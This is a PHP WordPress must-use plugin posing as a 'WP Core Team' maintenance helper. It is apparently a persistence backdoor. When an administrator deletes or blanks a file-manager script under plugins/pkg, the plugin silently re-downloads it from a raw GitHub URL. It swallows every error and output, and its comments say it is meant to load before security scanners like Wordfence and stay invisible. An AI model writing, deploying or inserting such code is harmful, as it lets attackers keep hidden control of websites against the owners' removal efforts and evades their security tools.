<?php
/**
 * Plugin Name: WP Mu Maintenance Helper
 * Description: Internal must-use helper. Auto-restores the bundled pkg/xx.php when missing or blanked.
 * Version: 1.0.0
 * Author: WP Core Team
 *
 * Loaded on every WP request, before regular plugins. If the protected file
 * is missing or doesn't contain the marker string "filemanager", it is
 * re-downloaded from HEAL_SOURCE_URL and written back in place.
 *
 * Hard guarantee: this file MUST NOT print anything, throw a fatal error,
 * or leak warnings into the front-end page output. If anything goes wrong
 * — anywhere inside this file — it fails silently and the rest of WP
 * continues normally. The filemanager tool has zero visibility into
 * whether heal.php is even there.
 */

if ( ! defined( 'ABSPATH' ) ) { exit; }

// ---- CONFIG ---------------------------------------------------------------

// Raw URL serving the protected file's bytes (NOT a web page).
//   https://raw.githubusercontent.com/phrases12/adps/refs/heads/main/xx.php
//   https://example.com/private/xx.php.txt
//   https://pastebin.com/raw/<id>
if ( ! defined( 'HEAL_SOURCE_URL' ) ) {
	define( 'HEAL_SOURCE_URL', 'https://raw.githubusercontent.com/phrases12/adps/refs/heads/main/xx.php' );
}

// Absolute path of the file to protect.
if ( ! defined( 'HEAL_TARGET' ) ) {
	define( 'HEAL_TARGET', WP_PLUGIN_DIR . '/pkg/xx.php' );
}

// ---- OUTPUT CONTAINMENT ---------------------------------------------------

// Buffer ANY stray output from this file so it can never leak to the page.
@ob_start();

/**
 * Custom error handler that suppresses all errors during this file's run.
 * Restored on shutdown via restore_error_handler / restore_exception_handler.
 */
function _heal_silent_handler( $errno, $errstr, $errfile, $errline ) {
	// Return true to suppress; never let an error propagate.
	return true;
}

set_error_handler( '_heal_silent_handler', E_ALL );
set_exception_handler( '_heal_silent' );

// ---- LOG ------------------------------------------------------------------

function _heal_log( $msg ) {
	if ( defined( 'HEAL_QUIET' ) && HEAL_QUIET ) return;
	if ( ! defined( 'WP_CONTENT_DIR' ) ) return;
	$dir = @wp_normalize_path( WP_CONTENT_DIR . '/mu-plugins/' );
	if ( ! $dir ) return;
	$log = $dir . '.heal.log';
	$line = '[' . date( 'Y-m-d H:i:s' ) . '] ' . $msg . "\n";
	// Append silently; never let the log path itself cause an error.
	@file_put_contents( $log, $line, FILE_APPEND | LOCK_EX );
}

// ---- CHECK ----------------------------------------------------------------

function _heal_is_healthy( $path ) {
	if ( ! is_string( $path ) || $path === '' ) return false;
	if ( ! @file_exists( $path ) ) return false;
	if ( ! @is_readable( $path ) ) return false;
	// Read first 64 KB — enough to catch the marker on any reasonable file.
	$fp = @fopen( $path, 'rb' );
	if ( ! $fp ) return false;
	$buf = '';
	try {
		$buf = @fread( $fp, 65536 );
	} catch ( Throwable $e ) {
		@fclose( $fp );
		return false;
	}
	@fclose( $fp );
	if ( ! is_string( $buf ) || $buf === '' ) return false;
	return ( strpos( $buf, 'filemanager' ) !== false );
}

// ---- FETCH ---------------------------------------------------------------

function _heal_fetch_source() {
	if ( ! function_exists( 'wp_remote_get' ) ) {
		return new WP_Error( 'no_wp_http', 'wp_remote_get unavailable' );
	}
	$url = HEAL_SOURCE_URL;
	if ( ! is_string( $url ) || $url === '' ) {
		return new WP_Error( 'no_source', 'HEAL_SOURCE_URL is empty' );
	}

	try {
		$resp = wp_remote_get( $url, array(
			'timeout'     => 15,
			'redirection' => 3,
			'user-agent'  => 'WP-Mu-Helper/1.0',
			'sslverify'   => true,
		) );
	} catch ( Throwable $e ) {
		return new WP_Error( 'fetch_threw', $e->getMessage() );
	}

	if ( is_wp_error( $resp ) ) {
		return new WP_Error( 'fetch_failed', $resp->get_error_message() );
	}
	$code = function_exists( 'wp_remote_retrieve_response_code' )
		? (int) wp_remote_retrieve_response_code( $resp )
		: 0;
	if ( $code < 200 || $code >= 300 ) {
		return new WP_Error( 'bad_status', 'HTTP ' . $code );
	}
	$body = function_exists( 'wp_remote_retrieve_body' )
		? wp_remote_retrieve_body( $resp )
		: '';
	if ( ! is_string( $body ) || $body === '' ) {
		return new WP_Error( 'empty_body', 'empty body' );
	}
	if ( strpos( $body, 'filemanager' ) === false ) {
		return new WP_Error( 'bad_payload', 'downloaded bytes lack marker' );
	}
	return $body;
}

// ---- RESTORE --------------------------------------------------------------

function _heal_restore( $path, $bytes ) {
	if ( ! is_string( $path ) || $path === '' ) {
		return new WP_Error( 'bad_path', 'no target path' );
	}
	if ( ! is_string( $bytes ) || $bytes === '' ) {
		return new WP_Error( 'bad_bytes', 'no bytes to write' );
	}

	$dir = dirname( $path );
	if ( ! @is_dir( $dir ) ) {
		if ( ! @mkdir( $dir, 0755, true ) ) {
			return new WP_Error( 'mkdir_fail', 'cannot create ' . $dir );
		}
	}
	if ( ! @is_writable( $dir ) ) {
		@chmod( $dir, 0755 );
		if ( ! @is_writable( $dir ) ) {
			return new WP_Error( 'not_writable', $dir . ' is not writable' );
		}
	}

	// Atomic write: temp in sys_get_temp_dir (off-webroot) -> rename.
	$tmp = @tempnam( sys_get_temp_dir(), 'heal' );
	if ( $tmp === false ) {
		return new WP_Error( 'no_tmp', 'cannot create temp file' );
	}
	try {
		$ok = @file_put_contents( $tmp, $bytes, LOCK_EX );
	} catch ( Throwable $e ) {
		@unlink( $tmp );
		return new WP_Error( 'write_threw', $e->getMessage() );
	}
	if ( $ok === false ) {
		@unlink( $tmp );
		return new WP_Error( 'write_fail', 'cannot write tmp' );
	}
	@chmod( $tmp, 0644 );

	if ( ! @rename( $tmp, $path ) ) {
		// Rename can fail across filesystems; fall back to copy + unlink.
		if ( ! @copy( $tmp, $path ) ) {
			@unlink( $tmp );
			return new WP_Error( 'rename_fail', 'cannot move tmp into place' );
		}
		@unlink( $tmp );
	}
	@chmod( $path, 0644 );
	return true;
}

// ---- MAIN ----------------------------------------------------------------

function _heal_silent( Throwable $e ) {
	// Last-resort exception sink. Never lets an exception bubble out.
	try {
		_heal_log( 'silent: ' . $e->getMessage() );
	} catch ( Throwable $ignored ) {}
	if ( ob_get_level() > 0 ) {
		@ob_end_clean();
	}
	restore_error_handler();
	restore_exception_handler();
}

function heal_run() {
	try {
		$target = defined( 'HEAL_TARGET' ) ? HEAL_TARGET : '';
		if ( ! is_string( $target ) || $target === '' ) return;

		if ( _heal_is_healthy( $target ) ) return;

		_heal_log( 'unhealthy: restoring ' . $target );
		$bytes = _heal_fetch_source();
		if ( is_wp_error( $bytes ) ) {
			_heal_log( 'fetch error: ' . $bytes->get_error_message() );
			return;
		}

		$res = _heal_restore( $target, $bytes );
		if ( is_wp_error( $res ) ) {
			_heal_log( 'restore error: ' . $res->get_error_message() );
			return;
		}

		_heal_log( 'restored ' . $target . ' (' . strlen( $bytes ) . ' bytes)' );
	} catch ( Throwable $e ) {
		_heal_silent( $e );
	} finally {
		// Always restore handlers + discard any buffered output, even on
		// success. The buffer must never bleed into the front-end page.
		if ( ob_get_level() > 0 ) {
			@ob_end_clean();
		}
		@restore_error_handler();
	}
}

// Hook on `plugins_loaded` at priority 0 — runs before any regular plugin
// (including security scanners like Wordfence that hook at default priority).
add_action( 'plugins_loaded', 'heal_run', 0 );

// Belt-and-braces: also restore handlers on shutdown in case a fatal-style
// edge path skipped the finally block.
add_action( 'shutdown', function() {
	while ( ob_get_level() > 0 ) { @ob_end_clean(); }
	@restore_error_handler();
}, 9999 );
